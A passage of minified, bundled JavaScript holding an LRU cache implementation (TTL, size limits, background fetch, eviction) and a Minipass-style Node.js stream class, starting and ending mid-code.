this.signal._onabort)W(Y);this.signal.onabort?.(Y)}};let X=c3.env?.LRU_CACHE_IGNORE_AC_WARNING!=="1",J=()=>{if(!X)return;X=!1,dR("AbortController is not defined. If using lru-cache in node 14, load an AbortController polyfill from the `node-abort-controller` package. A minimal polyfill is provided for use by LRUCache.fetch(), but it should not be relied upon in other contexts (eg, passing it to other APIs that use AbortController/AbortSignal might have undesirable effects). You may disable this with LRU_CACHE_IGNORE_AC_WARNING=1 in the env.","NO_ABORT_CONTROLLER","ENOTSUP",J)}}pe1=Symbol("type");x7=class x7 extends Array{constructor(X){super(X);this.fill(0)}};h7=class h7{#X;#J;#G;#Y;#H;#A;ttl;ttlResolution;ttlAutopurge;updateAgeOnGet;updateAgeOnHas;allowStale;noDisposeOnSet;noUpdateTTL;maxEntrySize;sizeCalculation;noDeleteOnFetchRejection;noDeleteOnStaleGet;allowStaleOnFetchAbort;allowStaleOnFetchRejection;ignoreFetchAbort;#V;#U;#z;#$;#W;#j;#O;#q;#Z;#N;#M;#L;#I;#R;#D;#w;#B;static unsafeExposeInternals(X){return{starts:X.#I,ttls:X.#R,sizes:X.#L,keyMap:X.#z,keyList:X.#$,valList:X.#W,next:X.#j,prev:X.#O,get head(){return X.#q},get tail(){return X.#Z},free:X.#N,isBackgroundFetch:(J)=>X.#K(J),backgroundFetch:(J,Q,Y,W)=>X.#y(J,Q,Y,W),moveToTail:(J)=>X.#m(J),indexes:(J)=>X.#P(J),rindexes:(J)=>X.#S(J),isStale:(J)=>X.#F(J)}}get max(){return this.#X}get maxSize(){return this.#J}get calculatedSize(){return this.#U}get size(){return this.#V}get fetchMethod(){return this.#H}get memoMethod(){return this.#A}get dispose(){return this.#G}get disposeAfter(){return this.#Y}constructor(X){let{max:J=0,ttl:Q,ttlResolution:Y=1,ttlAutopurge:W,updateAgeOnGet:G,updateAgeOnHas:H,allowStale:z,dispose:$,disposeAfter:V,noDisposeOnSet:K,noUpdateTTL:Z,maxSize:q=0,maxEntrySize:B=0,sizeCalculation:M,fetchMethod:O,memoMethod:R,noDeleteOnFetchRejection:I,noDeleteOnStaleGet:F,allowStaleOnFetchRejection:T,allowStaleOnFetchAbort:b,ignoreFetchAbort:h}=X;if(J!==0&&!MX(J))throw TypeError("max option must be a nonnegative integer");let L=J?iR(J):Array;if(!L)throw Error("invalid max value: "+J);if(this.#X=J,this.#J=q,this.maxEntrySize=B||this.#J,this.sizeCalculation=M,this.sizeCalculation){if(!this.#J&&!this.maxEntrySize)throw TypeError("cannot set sizeCalculation without setting maxSize or maxEntrySize");if(typeof this.sizeCalculation!=="function")throw TypeError("sizeCalculation set to non-function")}if(R!==void 0&&typeof R!=="function")throw TypeError("memoMethod must be a function if defined");if(this.#A=R,O!==void 0&&typeof O!=="function")throw TypeError("fetchMethod must be a function if specified");if(this.#H=O,this.#w=!!O,this.#z=new Map,this.#$=Array(J).fill(void 0),this.#W=Array(J).fill(void 0),this.#j=new L(J),this.#O=new L(J),this.#q=0,this.#Z=0,this.#N=$J.create(J),this.#V=0,this.#U=0,typeof $==="function")this.#G=$;if(typeof V==="function")this.#Y=V,this.#M=[];else this.#Y=void 0,this.#M=void 0;if(this.#D=!!this.#G,this.#B=!!this.#Y,this.noDisposeOnSet=!!K,this.noUpdateTTL=!!Z,this.noDeleteOnFetchRejection=!!I,this.allowStaleOnFetchRejection=!!T,this.allowStaleOnFetchAbort=!!b,this.ignoreFetchAbort=!!h,this.maxEntrySize!==0){if(this.#J!==0){if(!MX(this.#J))throw TypeError("maxSize must be a positive integer if specified")}if(!MX(this.maxEntrySize))throw TypeError("maxEntrySize must be a positive integer if specified");this.#_()}if(this.allowStale=!!z,this.noDeleteOnStaleGet=!!F,this.updateAgeOnGet=!!G,this.updateAgeOnHas=!!H,this.ttlResolution=MX(Y)||Y===0?Y:1,this.ttlAutopurge=!!W,this.ttl=Q||0,this.ttl){if(!MX(this.ttl))throw TypeError("ttl must be a positive integer if specified");this.#T()}if(this.#X===0&&this.ttl===0&&this.#J===0)throw TypeError("At least one of max, maxSize, or ttl is required");if(!this.ttlAutopurge&&!this.#X&&!this.#J){if(Nf1("LRU_CACHE_UNBOUNDED"))pR.add("LRU_CACHE_UNBOUNDED"),dR("TTL caching without ttlAutopurge, max, or maxSize can result in unbounded memory consumption.","UnboundedCacheWarning","LRU_CACHE_UNBOUNDED",h7)}}getRemainingTTL(X){return this.#z.has(X)?1/0:0}#T(){let X=new x7(this.#X),J=new x7(this.#X);this.#R=X,this.#I=J,this.#k=(W,G,H=zJ.now())=>{if(J[W]=G!==0?H:0,X[W]=G,G!==0&&this.ttlAutopurge){let z=setTimeout(()=>{if(this.#F(W))this.#E(this.#$[W],"expire")},G+1);if(z.unref)z.unref()}},this.#C=(W)=>{J[W]=X[W]!==0?zJ.now():0},this.#Q=(W,G)=>{if(X[G]){let H=X[G],z=J[G];if(!H||!z)return;W.ttl=H,W.start=z,W.now=Q||Y();let $=W.now-z;W.remainingTTL=H-$}};let Q=0,Y=()=>{let W=zJ.now();if(this.ttlResolution>0){Q=W;let G=setTimeout(()=>Q=0,this.ttlResolution);if(G.unref)G.unref()}return W};this.getRemainingTTL=(W)=>{let G=this.#z.get(W);if(G===void 0)return 0;let H=X[G],z=J[G];if(!H||!z)return 1/0;let $=(Q||Y())-z;return H-$},this.#F=(W)=>{let G=J[W],H=X[W];return!!H&&!!G&&(Q||Y())-G>H}}#C=()=>{};#Q=()=>{};#k=()=>{};#F=()=>!1;#_(){let X=new x7(this.#X);this.#U=0,this.#L=X,this.#b=(J)=>{this.#U-=X[J],X[J]=0},this.#f=(J,Q,Y,W)=>{if(this.#K(Q))return 0;if(!MX(Y))if(W){if(typeof W!=="function")throw TypeError("sizeCalculation must be a function");if(Y=W(Q,J),!MX(Y))throw TypeError("sizeCalculation return invalid (expect positive integer)")}else throw TypeError("invalid size value (must be positive integer). When maxSize or maxEntrySize is used, sizeCalculation or size must be set.");return Y},this.#v=(J,Q,Y)=>{if(X[J]=Q,this.#J){let W=this.#J-X[J];while(this.#U>W)this.#h(!0)}if(this.#U+=X[J],Y)Y.entrySize=Q,Y.totalCalculatedSize=this.#U}}#b=(X)=>{};#v=(X,J,Q)=>{};#f=(X,J,Q,Y)=>{if(Q||Y)throw TypeError("cannot set size without setting maxSize or maxEntrySize on cache");return 0};*#P({allowStale:X=this.allowStale}={}){if(this.#V)for(let J=this.#Z;;){if(!this.#x(J))break;if(X||!this.#F(J))yield J;if(J===this.#q)break;else J=this.#O[J]}}*#S({allowStale:X=this.allowStale}={}){if(this.#V)for(let J=this.#q;;){if(!this.#x(J))break;if(X||!this.#F(J))yield J;if(J===this.#Z)break;else J=this.#j[J]}}#x(X){return X!==void 0&&this.#z.get(this.#$[X])===X}*entries(){for(let X of this.#P())if(this.#W[X]!==void 0&&this.#$[X]!==void 0&&!this.#K(this.#W[X]))yield[this.#$[X],this.#W[X]]}*rentries(){for(let X of this.#S())if(this.#W[X]!==void 0&&this.#$[X]!==void 0&&!this.#K(this.#W[X]))yield[this.#$[X],this.#W[X]]}*keys(){for(let X of this.#P()){let J=this.#$[X];if(J!==void 0&&!this.#K(this.#W[X]))yield J}}*rkeys(){for(let X of this.#S()){let J=this.#$[X];if(J!==void 0&&!this.#K(this.#W[X]))yield J}}*values(){for(let X of this.#P())if(this.#W[X]!==void 0&&!this.#K(this.#W[X]))yield this.#W[X]}*rvalues(){for(let X of this.#S())if(this.#W[X]!==void 0&&!this.#K(this.#W[X]))yield this.#W[X]}[Symbol.iterator](){return this.entries()}[Symbol.toStringTag]="LRUCache";find(X,J={}){for(let Q of this.#P()){let Y=this.#W[Q],W=this.#K(Y)?Y.__staleWhileFetching:Y;if(W===void 0)continue;if(X(W,this.#$[Q],this))return this.get(this.#$[Q],J)}}forEach(X,J=this){for(let Q of this.#P()){let Y=this.#W[Q],W=this.#K(Y)?Y.__staleWhileFetching:Y;if(W===void 0)continue;X.call(J,W,this.#$[Q],this)}}rforEach(X,J=this){for(let Q of this.#S()){let Y=this.#W[Q],W=this.#K(Y)?Y.__staleWhileFetching:Y;if(W===void 0)continue;X.call(J,W,this.#$[Q],this)}}purgeStale(){let X=!1;for(let J of this.#S({allowStale:!0}))if(this.#F(J))this.#E(this.#$[J],"expire"),X=!0;return X}info(X){let J=this.#z.get(X);if(J===void 0)return;let Q=this.#W[J],Y=this.#K(Q)?Q.__staleWhileFetching:Q;if(Y===void 0)return;let W={value:Y};if(this.#R&&this.#I){let G=this.#R[J],H=this.#I[J];if(G&&H){let z=G-(zJ.now()-H);W.ttl=z,W.start=Date.now()}}if(this.#L)W.size=this.#L[J];return W}dump(){let X=[];for(let J of this.#P({allowStale:!0})){let Q=this.#$[J],Y=this.#W[J],W=this.#K(Y)?Y.__staleWhileFetching:Y;if(W===void 0||Q===void 0)continue;let G={value:W};if(this.#R&&this.#I){G.ttl=this.#R[J];let H=zJ.now()-this.#I[J];G.start=Math.floor(Date.now()-H)}if(this.#L)G.size=this.#L[J];X.unshift([Q,G])}return X}load(X){this.clear();for(let[J,Q]of X){if(Q.start){let Y=Date.now()-Q.start;Q.start=zJ.now()-Y}this.set(J,Q.value,Q)}}set(X,J,Q={}){if(J===void 0)return this.delete(X),this;let{ttl:Y=this.ttl,start:W,noDisposeOnSet:G=this.noDisposeOnSet,sizeCalculation:H=this.sizeCalculation,status:z}=Q,{noUpdateTTL:$=this.noUpdateTTL}=Q,V=this.#f(X,J,Q.size||0,H);if(this.maxEntrySize&&V>this.maxEntrySize){if(z)z.set="miss",z.maxEntrySizeExceeded=!0;return this.#E(X,"set"),this}let K=this.#V===0?void 0:this.#z.get(X);if(K===void 0){if(K=this.#V===0?this.#Z:this.#N.length!==0?this.#N.pop():this.#V===this.#X?this.#h(!1):this.#V,this.#$[K]=X,this.#W[K]=J,this.#z.set(X,K),this.#j[this.#Z]=K,this.#O[K]=this.#Z,this.#Z=K,this.#V++,this.#v(K,V,z),z)z.set="add";$=!1}else{this.#m(K);let Z=this.#W[K];if(J!==Z){if(this.#w&&this.#K(Z)){Z.__abortController.abort(Error("replaced"));let{__staleWhileFetching:q}=Z;if(q!==void 0&&!G){if(this.#D)this.#G?.(q,X,"set");if(this.#B)this.#M?.push([q,X,"set"])}}else if(!G){if(this.#D)this.#G?.(Z,X,"set");if(this.#B)this.#M?.push([Z,X,"set"])}if(this.#b(K),this.#v(K,V,z),this.#W[K]=J,z){z.set="replace";let q=Z&&this.#K(Z)?Z.__staleWhileFetching:Z;if(q!==void 0)z.oldValue=q}}else if(z)z.set="update"}if(Y!==0&&!this.#R)this.#T();if(this.#R){if(!$)this.#k(K,Y,W);if(z)this.#Q(z,K)}if(!G&&this.#B&&this.#M){let Z=this.#M,q;while(q=Z?.shift())this.#Y?.(...q)}return this}pop(){try{while(this.#V){let X=this.#W[this.#q];if(this.#h(!0),this.#K(X)){if(X.__staleWhileFetching)return X.__staleWhileFetching}else if(X!==void 0)return X}}finally{if(this.#B&&this.#M){let X=this.#M,J;while(J=X?.shift())this.#Y?.(...J)}}}#h(X){let J=this.#q,Q=this.#$[J],Y=this.#W[J];if(this.#w&&this.#K(Y))Y.__abortController.abort(Error("evicted"));else if(this.#D||this.#B){if(this.#D)this.#G?.(Y,Q,"evict");if(this.#B)this.#M?.push([Y,Q,"evict"])}if(this.#b(J),X)this.#$[J]=void 0,this.#W[J]=void 0,this.#N.push(J);if(this.#V===1)this.#q=this.#Z=0,this.#N.length=0;else this.#q=this.#j[J];return this.#z.delete(Q),this.#V--,J}has(X,J={}){let{updateAgeOnHas:Q=this.updateAgeOnHas,status:Y}=J,W=this.#z.get(X);if(W!==void 0){let G=this.#W[W];if(this.#K(G)&&G.__staleWhileFetching===void 0)return!1;if(!this.#F(W)){if(Q)this.#C(W);if(Y)Y.has="hit",this.#Q(Y,W);return!0}else if(Y)Y.has="stale",this.#Q(Y,W)}else if(Y)Y.has="miss";return!1}peek(X,J={}){let{allowStale:Q=this.allowStale}=J,Y=this.#z.get(X);if(Y===void 0||!Q&&this.#F(Y))return;let W=this.#W[Y];return this.#K(W)?W.__staleWhileFetching:W}#y(X,J,Q,Y){let W=J===void 0?void 0:this.#W[J];if(this.#K(W))return W;let G=new p4,{signal:H}=Q;H?.addEventListener("abort",()=>G.abort(H.reason),{signal:G.signal});let z={signal:G.signal,options:Q,context:Y},$=(M,O=!1)=>{let{aborted:R}=G.signal,I=Q.ignoreFetchAbort&&M!==void 0;if(Q.status)if(R&&!O){if(Q.status.fetchAborted=!0,Q.status.fetchError=G.signal.reason,I)Q.status.fetchAbortIgnored=!0}else Q.status.fetchResolved=!0;if(R&&!I&&!O)return K(G.signal.reason);let F=q;if(this.#W[J]===q)if(M===void 0)if(F.__staleWhileFetching)this.#W[J]=F.__staleWhileFetching;else this.#E(X,"fetch");else{if(Q.status)Q.status.fetchUpdated=!0;this.set(X,M,z.options)}return M},V=(M)=>{if(Q.status)Q.status.fetchRejected=!0,Q.status.fetchError=M;return K(M)},K=(M)=>{let{aborted:O}=G.signal,R=O&&Q.allowStaleOnFetchAbort,I=R||Q.allowStaleOnFetchRejection,F=I||Q.noDeleteOnFetchRejection,T=q;if(this.#W[J]===q){if(!F||T.__staleWhileFetching===void 0)this.#E(X,"fetch");else if(!R)this.#W[J]=T.__staleWhileFetching}if(I){if(Q.status&&T.__staleWhileFetching!==void 0)Q.status.returnedStale=!0;return T.__staleWhileFetching}else if(T.__returned===T)throw M},Z=(M,O)=>{let R=this.#H?.(X,W,z);if(R&&R instanceof Promise)R.then((I)=>M(I===void 0?void 0:I),O);G.signal.addEventListener("abort",()=>{if(!Q.ignoreFetchAbort||Q.allowStaleOnFetchAbort){if(M(void 0),Q.allowStaleOnFetchAbort)M=(I)=>$(I,!0)}})};if(Q.status)Q.status.fetchDispatched=!0;let q=new Promise(Z).then($,V),B=Object.assign(q,{__abortController:G,__staleWhileFetching:W,__returned:void 0});if(J===void 0)this.set(X,B,{...z.options,status:void 0}),J=this.#z.get(X);else this.#W[J]=B;return B}#K(X){if(!this.#w)return!1;let J=X;return!!J&&J instanceof Promise&&J.hasOwnProperty("__staleWhileFetching")&&J.__abortController instanceof p4}async fetch(X,J={}){let{allowStale:Q=this.allowStale,updateAgeOnGet:Y=this.updateAgeOnGet,noDeleteOnStaleGet:W=this.noDeleteOnStaleGet,ttl:G=this.ttl,noDisposeOnSet:H=this.noDisposeOnSet,size:z=0,sizeCalculation:$=this.sizeCalculation,noUpdateTTL:V=this.noUpdateTTL,noDeleteOnFetchRejection:K=this.noDeleteOnFetchRejection,allowStaleOnFetchRejection:Z=this.allowStaleOnFetchRejection,ignoreFetchAbort:q=this.ignoreFetchAbort,allowStaleOnFetchAbort:B=this.allowStaleOnFetchAbort,context:M,forceRefresh:O=!1,status:R,signal:I}=J;if(!this.#w){if(R)R.fetch="get";return this.get(X,{allowStale:Q,updateAgeOnGet:Y,noDeleteOnStaleGet:W,status:R})}let F={allowStale:Q,updateAgeOnGet:Y,noDeleteOnStaleGet:W,ttl:G,noDisposeOnSet:H,size:z,sizeCalculation:$,noUpdateTTL:V,noDeleteOnFetchRejection:K,allowStaleOnFetchRejection:Z,allowStaleOnFetchAbort:B,ignoreFetchAbort:q,status:R,signal:I},T=this.#z.get(X);if(T===void 0){if(R)R.fetch="miss";let b=this.#y(X,T,F,M);return b.__returned=b}else{let b=this.#W[T];if(this.#K(b)){let _=Q&&b.__staleWhileFetching!==void 0;if(R){if(R.fetch="inflight",_)R.returnedStale=!0}return _?b.__staleWhileFetching:b.__returned=b}let h=this.#F(T);if(!O&&!h){if(R)R.fetch="hit";if(this.#m(T),Y)this.#C(T);if(R)this.#Q(R,T);return b}let L=this.#y(X,T,F,M),k=L.__staleWhileFetching!==void 0&&Q;if(R){if(R.fetch=h?"stale":"refresh",k&&h)R.returnedStale=!0}return k?L.__staleWhileFetching:L.__returned=L}}async forceFetch(X,J={}){let Q=await this.fetch(X,J);if(Q===void 0)throw Error("fetch() returned undefined");return Q}memo(X,J={}){let Q=this.#A;if(!Q)throw Error("no memoMethod provided to constructor");let{context:Y,forceRefresh:W,...G}=J,H=this.get(X,G);if(!W&&H!==void 0)return H;let z=Q(X,H,{options:G,context:Y});return this.set(X,z,G),z}get(X,J={}){let{allowStale:Q=this.allowStale,updateAgeOnGet:Y=this.updateAgeOnGet,noDeleteOnStaleGet:W=this.noDeleteOnStaleGet,status:G}=J,H=this.#z.get(X);if(H!==void 0){let z=this.#W[H],$=this.#K(z);if(G)this.#Q(G,H);if(this.#F(H)){if(G)G.get="stale";if(!$){if(!W)this.#E(X,"expire");if(G&&Q)G.returnedStale=!0;return Q?z:void 0}else{if(G&&Q&&z.__staleWhileFetching!==void 0)G.returnedStale=!0;return Q?z.__staleWhileFetching:void 0}}else{if(G)G.get="hit";if($)return z.__staleWhileFetching;if(this.#m(H),Y)this.#C(H);return z}}else if(G)G.get="miss"}#g(X,J){this.#O[J]=X,this.#j[X]=J}#m(X){if(X!==this.#Z){if(X===this.#q)this.#q=this.#j[X];else this.#g(this.#O[X],this.#j[X]);this.#g(this.#Z,X),this.#Z=X}}delete(X){return this.#E(X,"delete")}#E(X,J){let Q=!1;if(this.#V!==0){let Y=this.#z.get(X);if(Y!==void 0)if(Q=!0,this.#V===1)this.#u(J);else{this.#b(Y);let W=this.#W[Y];if(this.#K(W))W.__abortController.abort(Error("deleted"));else if(this.#D||this.#B){if(this.#D)this.#G?.(W,X,J);if(this.#B)this.#M?.push([W,X,J])}if(this.#z.delete(X),this.#$[Y]=void 0,this.#W[Y]=void 0,Y===this.#Z)this.#Z=this.#O[Y];else if(Y===this.#q)this.#q=this.#j[Y];else{let G=this.#O[Y];this.#j[G]=this.#j[Y];let H=this.#j[Y];this.#O[H]=this.#O[Y]}this.#V--,this.#N.push(Y)}}if(this.#B&&this.#M?.length){let Y=this.#M,W;while(W=Y?.shift())this.#Y?.(...W)}return Q}clear(){return this.#u("delete")}#u(X){for(let J of this.#S({allowStale:!0})){let Q=this.#W[J];if(this.#K(Q))Q.__abortController.abort(Error("deleted"));else{let Y=this.#$[J];if(this.#D)this.#G?.(Q,Y,X);if(this.#B)this.#M?.push([Q,Y,X])}}if(this.#z.clear(),this.#W.fill(void 0),this.#$.fill(void 0),this.#R&&this.#I)this.#R.fill(0),this.#I.fill(0);if(this.#L)this.#L.fill(0);if(this.#q=0,this.#Z=0,this.#N.length=0,this.#U=0,this.#V=0,this.#B&&this.#M){let J=this.#M,Q;while(Q=J?.shift())this.#Y?.(...Q)}}}});import{EventEmitter as a3}from"node:events";import tR from"node:stream";import{StringDecoder as Lf1}from"node:string_decoder";class n3{src;dest;opts;ondrain;constructor(X,J,Q){this.src=X,this.dest=J,this.opts=Q,this.ondrain=()=>X[KJ](),this.dest.on("drain",this.ondrain)}unpipe(){this.dest.removeListener("drain",this.ondrain)}proxyErrors(X){}end(){if(this.unpipe(),this.opts.end)this.dest.end()}}var aR,If1=(X)=>!!X&&typeof X==="object"&&(X instanceof eX||X instanceof tR||Cf1(X)||Pf1(X)),Cf1=(X)=>!!X&&typeof X==="object"&&X instanceof a3&&typeof X.pipe==="function"&&X.pipe!==tR.Writable.prototype.pipe,Pf1=(X)=>!!X&&typeof X==="object"&&X instanceof a3&&typeof X.write==="function"&&typeof X.end==="function",y6,g6,jX,d4,y7,i4,nR,r4,sR,a9,VJ,E0,g7,KJ,k0,X9,b0,l3,a4,d0,w0,p3,d3,oR,i3,q6,r3,n4,m7,tX,F9,u7=(X)=>Promise.resolve().then(X),Sf1=(X)=>X(),Tf1=(X)=>X==="end"||X==="finish"||X==="prefinish",_f1=(X)=>X instanceof ArrayBuffer||!!X&&typeof X==="object"&&X.constructor&&X.constructor.name==="ArrayBuffer"&&X.byteLength>=0,Ef1=(X)=>!Buffer.isBuffer(X)&&ArrayBuffer.isView(X),eR,kf1=(X)=>!!X.objectMode,bf1=(X)=>!X.objectMode&&!!X.encoding&&X.encoding!=="buffer",eX;var s3=s(()=>{aR=typeof process==="object"&&process?process:{stdout:null,stderr:null},y6=Symbol("EOF"),g6=Symbol("maybeEmitEnd"),jX=Symbol("emittedEnd"),d4=Symbol("emittingEnd"),y7=Symbol("emittedError"),i4=Symbol("closed"),nR=Symbol("read"),r4=Symbol("flush"),sR=Symbol("flushChunk"),a9=Symbol("encoding"),VJ=Symbol("decoder"),E0=Symbol("flowing"),g7=Symbol("paused"),KJ=Symbol("resume"),k0=Symbol("buffer"),X9=Symbol("pipes"),b0=Symbol("bufferLength"),l3=Symbol("bufferPush"),a4=Symbol("bufferShift"),d0=Symbol("objectMode"),w0=Symbol("destroyed"),p3=Symbol("error"),d3=Symbol("emitData"),oR=Symbol("emitEnd"),i3=Symbol("emitEnd2"),q6=Symbol("async"),r3=Symbol("abort"),n4=Symbol("aborted"),m7=Symbol("signal"),tX=Symbol("dataListeners"),F9=Symbol("discarded");eR=class eR extends n3{unpipe(){this.src.removeListener("error",this.proxyErrors),super.unpipe()}constructor(X,J,Q){super(X,J,Q);this.proxyErrors=(Y)=>J.emit("error",Y),X.on("error",this.proxyErrors)}};eX=class eX extends a3{[E0]=!1;[g7]=!1;[X9]=[];[k0]=[];[d0];[a9];[q6];[VJ];[y6]=!1;[jX]=!1;[d4]=!1;[i4]=!1;[y7]=null;[b0]=0;[w0]=!1;[m7];[n4]=!1;[tX]=0;[F9]=!1;writable=!0;readable=!0;constructor(...X){let J=X[0]||{};super();if(J.objectMode&&typeof J.encoding==="string")throw TypeError("Encoding and objectMode may not be used together");if(kf1(J))this[d0]=!0,this[a9]=null;else if(bf1(J))this[a9]=J.encoding,this[d0]=!1;else this[d0]=!1,this[a9]=null;if(this[q6]=!!J.async,this[VJ]=this[a9]?new Lf1(this[a9]):null,J&&J.debugExposeBuffer===!0)Object.defineProperty(this,"buffer",{get:()=>this[k0]});if(J&&J.debugExposePipes===!0)Object.defineProperty(this,"pipes",{get:()=>this[X9]});let{signal:Q}=J;if(Q)if(this[m7]=Q,Q.aborted)this[r3]();else Q.addEventListener("abort",()=>this[r3]())}get bufferLength(){return this[b0]}get encoding(){return this[a9]}set encoding(X){throw Error("Encoding must be set at instantiation time")}setEncoding(X){throw Error("Encoding must be set at instantiation time")}get objectMode(){return this[d0]}set objectMode(X){throw Error("objectMode must be set at instantiation time")}get["async"](){return this[q6]}set["async"](X){this[q6]=this[q6]||!!X}[r3](){this[n4]=!0,this.emit("abort",this[m7]?.reason),this.destroy(this[m7]?.reason)}get aborted(){return this[n4]}set aborted(X){}write(X,J,Q){if(this[n4])return!1;if(this[y6])throw Error("write after end");if(this[w0])return this.emit("error",Object.assign(Error("Cannot call write after a stream was destroyed"),{code:"ERR_STREAM_DESTROYED"})),!0;if(typeof J==="function")Q=J,J="utf8";if(!J)J="utf8";let Y=this[q6]?u7:Sf1;if(!this[d0]&&!Buffer.isBuffer(X)){if(Ef1(X))X=Buffer.from(X.buffer,X.byteOffset,X.byteLength);else if(_f1(X))X=Buffer.from(X);else if(typeof X!=="string")throw Error("Non-contiguous data written to non-objectMode stream")}if(this[d0]){if(this[E0]&&this[b0]!==0)this[r4](!0);if(this[E0])this.emit("data",X);else this[l3](X);if(this[b0]!==0)this.emit("readable");if(Q)Y(Q);return this[E0]}if(!X.length){if(this[b0]!==0)this.emit("readable");if(Q)Y(Q);return this[E0]}if(typeof X==="string"&&!(J===this[a9]&&!this[VJ]?.lastNeed))X=Buffer.from(X,J);if(Buffer.isBuffer(X)&&this[a9])X=this[VJ].write(X);if(this[E0]&&this[b0]!==0)this[r4](!0);if(this[E0])this.emit("data",X);else this[l3](X);if(this[b0]!==0)this.emit("readable");if(Q)Y(Q);return this[E0]}read(X){if(this[w0])return null;if(this[F9]=!1,this[b0]===0||X===0||X&&X>this[b0])return this[g6](),null;if(this[d0])X=null;if(this[k0].length>1&&!this[d0])this[k0]=[this[a9]?this[k0].join(""):Buffer.concat(this[k0],this[b0])];let J=this[nR](X||null,this[k0][0]);return this[g6](),J}[nR](X,J){if(this[d0])this[a4]();else{let Q=J;if(X===Q.length||X===null)this[a4]();else if(typeof Q==="string")this[k0][0]=Q.slice(X),J=Q.slice(0,X),this[b0]-=X;else this[k0][0]=Q.subarray(X),J=Q.subarray(0,X),this[b0]-=X}if(this.emit("data",J),!this[k0].length&&!this[y6])this.emit("drain");return J}end(X,J,Q){if(typeof X==="function")Q=X,X=void 0;if(typeof J==="function")Q=J,J="utf8";if(X!==void 0)this.write(X,J);if(Q)this.once("end",Q);if(this[y6]=!0,this.writable=!1,this[E0]||!this[g7])this[g6]();return this}[KJ](){if(this[w0])return;if(!this[tX]&&!this[X9].length)this[F9]=!0;if(this[g7]=!1,this[E0]=!0,this.emit("resume"),this[k0].length)this[r4]();else if(this[y6])this[g6]();else this.emit("drain")}resume(){return this[KJ]()}pause(){this[E0]=!1,this[g7]=!0,this[F9]=!1}get destroyed(){return this[w0]}get flowing(){return this[E0]}get paused(){return this[g7]}[l3](X){if(this[d0])this[b0]+=1;else this[b0]+=X.length;this[k0].push(X)}[a4](){if(this[d0])this[b0]-=1;else this[b0]-=this[k0][0].length;return this[k0].shift()}[r4](X=!1){do;while(this[sR](this[a4]())&&this[k0].length);if(!X&&!this[k0].length&&!this[y6])this.emit("drain")}[sR](X){return this.emit("data",X),this[E0]}pipe(X,J){if(this[w0])return X;this[F9]=!1;let Q=this[jX];if(J=J||{},X===aR.stdout||X===aR.stderr)J.end=!1;else J.end=J.end!==!1;if(J.proxyErrors=!!J.proxyErrors,Q){if(J.end)X.end()}else if(this[X9].push(!J.proxyErrors?new n3(this,X,J):new eR(this,X,J)),this[q6])u7(()=>this[KJ]());else this[KJ]();return X}unpipe(X){let J=this[X9].find((Q)=>Q.dest===X);if(J){if(this[X9].length===1){if(this[E0]&&this[tX]===0)this[E0]=!1;this[X9]=[]}else this[X9].splice(this[X9].indexOf(J),1);J.unpipe()}}addListener(X,J){return this.on(X,J)}on(X,J){let Q=super.on(X,J);if(X==="data"){if(this[F9]=!1,this[tX]++,!this[X9].length&&!this[E0])this[KJ]()}else if(X==="readable"&&this[b0]!==0)super.emit("readable");else if(Tf1(X)&&this[jX])super.emit(X),this.removeAllListeners(X);else if(X==="error"&&this[y7]){let Y=J;if(this[q6])u7(()=>Y.call(this,this[y7]));else Y.call(this,this[y7])}return Q}removeListener(X,J){return this.off(X,J)}off(X,J){let Q=super.off(X,J);if(X==="data"){if(this[tX]=this.listeners("data").length,this[tX]===0&&!this[F9]&&!this[X9].length)this[E0]=!1}return Q}removeAllListeners(X){let J=super.removeAllListeners(X);if(X==="data"||X===void 0){if(this[tX]=0,!this[F9]&&!this[X9].length)this[E0]=!1}return J}get emittedEnd(){return this[jX]}[g6](){if(!this[d4]&&!this[jX]&&!this[w0]&&this[k0].length===0&&this[y6]){if(this[d4]=!0,this.emit("end"),this.emit("prefinish"),this.emit("finish"),this[i4])this.emit("close");this[d4]=!1}}emit(X,...J){let Q=J[0];if(X!=="error"&&X!=="close"&&X!==w0&&this[w0])return!1;else if(X==="data")return!this[d0]&&!Q?!1:this[q6]?(u7(()=>this[d3](Q)),!0):this[d3](Q);else if(X==="end")return this[oR]();else if(X==="close"){if(this[i4]=!0,!this[jX]&&!this[w0])return!1;let W=super.emit("close");return this.removeAllListeners("close"),W}else if(X==="error"){this[y7]=Q,super.emit(p3,Q);let W=!this[m7]||this.listeners("error").length?super.emit("error",Q):!1;return this[g6](),W}else if(X==="resume"){let W=super.emit("resume");return this[g6](),W}else if(X==="finish"||X==="prefinish"){let W=super.emit(X);return this.removeAllListeners(X),W}let Y=super.emit(X,...J);return this[g6](),Y}[d3](X){for(let Q of this[X9])if(Q.dest.write(X)===!1)this.pause();let J=this[F9]?!1:super.emit("data",X);return this[g6](),J}[oR](){if(this[jX])return!1;return this[jX]=!0,this.readable=!1,this[q6]?(u7(()=>this[i3]()),!0):this[i3]()}[i3](){if(this[VJ]){let J=this[VJ].end();if(J){for(let Q of this[X9])Q.dest.write(J);if(!this[F9])super.emit("data",J)}}for(let J of this[X9])J.end();let X=super.emit("end");return this.removeAllListeners("end"),X}async collect(){let X=Object.assign([],{dataLength:0});if(!this[d0])X.dataLength=0;let J=this.promise();return this.on("data",(Q)=>{if(X.push(Q),!this[d0])X.dataLength+=Q.length}),await J,X}async concat(){if(this[d0])throw Error("cannot concat in objectMode");let X=await this.collect();return this[a9]?X.join(""):Buffer.concat(X,X.dataLength)}async promise(){return new Promise((X,J)=>{this.on(w0,()=>J(Error("stream destroyed"))),this.on("error",(Q)=>J(Q)),this.on("end",()=>X())})}[Symbol.asyncIterator](){this[F9]=!1;let X=!1,J=async()=>{return this.pause(),X=!0,{value:void 0,done:!0}};return{next:()=>{if(X)return J();let Y=this.read();if(Y!==null)return Promise.resolve({done:!1,value:Y});if(this[y6])return J();let W,G,H=(K)=>{this.off("data",z),this.off("end",$),this.off(w0,V),J(),G(K)},z=(K)=>{this.off("error",H),this.off("end",$),this.off(w0,V),this.pause(),W({value:K,done:!!this[y6]})},$=()=>{this.off("error",H),this.off("data",z),this.off(w0,V),J(),W({done:!0,value:void 0})},V=()=>H(Error("stream destroyed"));return new Promise((K,Z)=>{G=Z,W=K,this.once(w0,V),this.once("error",H),this.once("end",$),this.once("data",z)})},throw:J,return:J,[Symbol.asyncIterator](){return this}}}[Symbol.iterator](){this[F9]=!1;let X=!1,J=()=>{return this.pause(),this.off(p3,J),this.off(w0,J),this.off("end",J),X=!0,{done:!0,value:void 0}},Q=()=>{if(X)return J();let Y=this.read();return Y===null?J():{done:!1,value:Y}};return this.once("end",J),this.once(p3,J),this.once(w0,J),{next:Q,throw:J,return:J,[Symbol.iterator](){return this}}}destroy(X){if(this[w0]){if(X)this.emit("error",X);else 